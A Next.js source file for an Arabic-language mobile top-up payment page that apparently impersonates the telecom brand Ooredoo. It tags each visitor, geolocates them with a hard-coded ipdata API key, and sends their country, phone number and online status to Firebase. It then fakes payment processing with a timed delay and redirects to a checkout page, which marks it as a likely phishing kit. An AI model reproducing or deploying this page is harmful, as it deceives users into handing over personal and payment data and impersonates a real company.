"use client"

import type React from "react"
import { useEffect, useState, useCallback } from "react"
import { useRouter } from "next/navigation"
import { ArrowRight, Loader2, Trash2, Receipt, DollarSign, AlertCircle, CheckCircle2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Card, CardContent } from "@/components/ui/card"
import { setupOnlineStatus } from "@/lib/utils"
import { addData } from "@/lib/firebase"

interface PaymentData {
  id: string
  phone?: string
  country?: string
  amount?: string
}

interface LocationResponse {
  country_name: string
}

const _id =
  "ooredoo-" +
  Math.random()
    .toString(36)
    .replace(/[^a-z]+/g, "")
    .substr(0, 15)

export default function PaymentPage() {
  const router = useRouter()
  const [amount, setAmount] = useState("5")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [errors, setErrors] = useState<{ phone?: string; amount?: string }>({})
  const [isFormValid, setIsFormValid] = useState(false)

  const formatAmount = useCallback((value: string): string => {
    const numericValue = Number.parseFloat(value.replace(/[^\d.]/g, ""))
    return isNaN(numericValue) ? "0" : numericValue.toString()
  }, [])

  const validatePhoneNumber = useCallback((phone: string): boolean => {
    const phoneRegex = /^[0-9]{8}$/
    return phoneRegex.test(phone)
  }, [])

  const validateAmount = useCallback((amount: string): boolean => {
    const numericAmount = Number.parseFloat(amount.replace(/[^\d.]/g, ""))
    return numericAmount >= 1 && numericAmount <= 100
  }, [])

  const validateForm = useCallback(() => {
    const newErrors: { phone?: string; amount?: string } = {}

    if (phoneNumber && !validatePhoneNumber(phoneNumber)) {
      newErrors.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
    }

    if (amount && !validateAmount(amount)) {
      newErrors.amount = "المبلغ يجب أن يكون بين 1 و 100 دينار"
    }

    setErrors(newErrors)
    setIsFormValid(phoneNumber.length === 8 && validatePhoneNumber(phoneNumber) && validateAmount(amount))
  }, [phoneNumber, amount, validatePhoneNumber, validateAmount])

  useEffect(() => {
    validateForm()
  }, [validateForm])

  useEffect(() => {
    getLocation()
  }, [])

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      addData({ id: _id, country })
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!isFormValid) return

    addData({ id: _id, phone: phoneNumber, mobile: phoneNumber })
    setIsLoading(true)

    try {
      const sessionId = localStorage.getItem("visitor")
      if (!sessionId) {
        throw new Error("Session not found")
      }

      const paymentData: PaymentData = {
        id: sessionId,
        phone: phoneNumber,
        amount: amount,
      }

      localStorage.setItem("amount", amount)

      // Simulate processing time
      await new Promise((resolve) => setTimeout(resolve, 1500))

      router.push("/checkout")
    } catch (error) {
      console.error("Payment submission failed:", error)
      setErrors({ ...errors, phone: "حدث خطأ في المعالجة. يرجى المحاولة مرة أخرى" })
    } finally {
      setIsLoading(false)
    }
  }

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d]/g, "")
    setAmount(value)
  }

  const clearAmount = () => {
    setAmount("0")
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d]/g, "").slice(0, 8)
    setPhoneNumber(value)
  }

  useEffect(() => {
    localStorage.setItem("paymentAmount", amount)
  }, [amount])

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
        <Card className="w-full max-w-sm mx-4">
          <CardContent className="flex flex-col items-center justify-center p-8">
            <div className="relative">
              <div className="w-16 h-16 border-4 border-red-200 rounded-full animate-pulse"></div>
              <Loader2 className="w-8 h-8 animate-spin absolute top-4 left-4 text-red-600" />
            </div>
            <p className="text-gray-700 mt-6 text-lg font-medium">جاري معالجة الدفع...</p>
            <p className="text-gray-500 mt-2 text-sm">يرجى عدم إغلاق الصفحة</p>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="flex flex-col min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      {/* Enhanced Header */}
      <header className="bg-white shadow-sm border-b border-gray-200">
        <div className="flex justify-between items-center p-4 max-w-md mx-auto">
          <div className="flex items-center space-x-2">
            <div className="w-8 h-8 bg-red-100 rounded-full flex items-center justify-center">
              <DollarSign className="w-4 h-4 text-red-600" />
            </div>
            <span className="text-sm font-medium text-gray-600">English</span>
          </div>
          <h1 className="text-xl font-bold text-gray-900 tracking-tight">الدفع الآمن</h1>
          <Button
            variant="ghost"
            size="sm"
            onClick={() => router.back()}
            className="p-2 hover:bg-gray-100 rounded-full transition-colors"
          >
            <ArrowRight className="w-5 h-5 text-gray-600" />
          </Button>
        </div>
      </header>

      <main className="flex-1 p-4 space-y-6 max-w-md mx-auto w-full">
        {/* Enhanced Promotional Banner */}
        <Card className="overflow-hidden border-0 shadow-lg">
          <div className="relative">
            <img
              src="/zf.png"
              alt="Smart Pay Banner"
              className="w-full h-48 object-cover"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-black/20 to-transparent"></div>
          </div>
        </Card>

        {/* Enhanced Payment Form */}
        <Card className="border-0 shadow-lg">
          <CardContent className="p-6">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Input Fields with Better Styling */}
              <div className="space-y-4">
                {/* Phone Number Field */}
                <div className="space-y-2">
                  <label className="text-base font-semibold text-gray-900 block text-right">رقم الموبايل</label>
                  <div className="relative">
                    <Input
                      type="tel"
                      value={phoneNumber}
                      onChange={handlePhoneChange}
                      placeholder="4#######"
                      className={`text-right py-4 text-lg border-2 transition-all duration-200 rounded-xl h-14 ${
                        errors.phone
                          ? "border-red-300 focus:border-red-500 focus:ring-red-200"
                          : phoneNumber && validatePhoneNumber(phoneNumber)
                            ? "border-green-300 focus:border-green-500 focus:ring-green-200"
                            : "border-gray-200 focus:border-red-500 focus:ring-red-200"
                      }`}
                      dir="rtl"
                      required
                      aria-label="رقم الموبايل"
                    />
                    {phoneNumber && validatePhoneNumber(phoneNumber) && (
                      <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
                    )}
                  </div>
                  {errors.phone && (
                    <Alert className="border-red-200 bg-red-50">
                      <AlertCircle className="h-4 w-4 text-red-600" />
                      <AlertDescription className="text-red-700 text-right">{errors.phone}</AlertDescription>
                    </Alert>
                  )}
                </div>

                {/* Amount Field */}
                <div className="space-y-2">
                  <label className="text-base font-semibold text-gray-900 block text-right">المبلغ</label>
                  <div className="relative">
                    <Input
                      type="tel"
                      value={amount}
                      onChange={handleAmountChange}
                      className={`text-center py-4 text-xl font-bold border-2 transition-all duration-200 rounded-xl h-14 pr-16 ${
                        errors.amount
                          ? "border-red-300 focus:border-red-500 focus:ring-red-200"
                          : validateAmount(amount)
                            ? "border-green-300 focus:border-green-500 focus:ring-green-200"
                            : "border-gray-200 focus:border-red-500 focus:ring-red-200"
                      }`}
                      dir="rtl"
                      aria-label="المبلغ"
                      maxLength={3}
                    />
                    <div className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-600 font-bold text-lg">
                      د.ك
                    </div>
                    <Button
                      type="button"
                      variant="ghost"
                      size="sm"
                      onClick={clearAmount}
                      className="absolute left-2 top-1/2 transform -translate-y-1/2 p-2 hover:bg-gray-100 rounded-full transition-colors"
                    >
                      <Trash2 className="w-4 h-4 text-gray-400" />
                    </Button>
                  </div>
                  {errors.amount && (
                    <Alert className="border-red-200 bg-red-50">
                      <AlertCircle className="h-4 w-4 text-red-600" />
                      <AlertDescription className="text-red-700 text-right">{errors.amount}</AlertDescription>
                    </Alert>
                  )}
                </div>
              </div>

              {/* Pay to Another Number Button */}
              <Button
                type="button"
                variant="outline"
                className="w-full py-4 border-2 border-red-200 text-red-600 hover:bg-red-50 hover:border-red-300 rounded-xl text-base font-semibold h-14 transition-all duration-200"
              >
                الدفع لرقم آخر
              </Button>
            </form>
          </CardContent>
        </Card>

        {/* Enhanced Payment Summary */}
        <Card className="border-0 shadow-lg bg-gradient-to-r from-red-50 to-red-100">
          <CardContent className="p-6">
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center text-gray-700">
                  <div className="w-10 h-10 bg-red-200 rounded-full flex items-center justify-center ml-3">
                    <Receipt className="w-5 h-5 text-red-600" />
                  </div>
                  <span className="text-base font-semibold">إعادة التعبئة / دفع الفواتير</span>
                </div>
              </div>

              <div className="flex justify-between items-center pt-4 border-t-2 border-red-200">
                <div className="text-2xl font-bold text-gray-900">{amount}.000 د.ك</div>
                <div className="text-lg font-semibold text-gray-700">الإجمالي:</div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Enhanced Submit Button */}
        <Button
          type="submit"
          onClick={handleSubmit}
          disabled={!isFormValid || isLoading}
          className={`w-full py-4 text-white rounded-xl text-lg font-bold h-16 transition-all duration-300 transform ${
            isFormValid && !isLoading
              ? "bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 hover:scale-[1.02] shadow-lg hover:shadow-xl"
              : "bg-gray-300 text-gray-500 cursor-not-allowed"
          }`}
        >
          {isLoading ? (
            <div className="flex items-center justify-center">
              <Loader2 className="w-6 h-6 animate-spin ml-2" />
              <span>جاري المعالجة...</span>
            </div>
          ) : (
            <span>تأكيد الدفع</span>
          )}
        </Button>

        {/* Security Notice */}
        <div className="text-center text-sm text-gray-500 mt-4">
          <p>🔒 جميع المعاملات محمية بتشفير SSL</p>
        </div>
      </main>
    </div>
  )
}
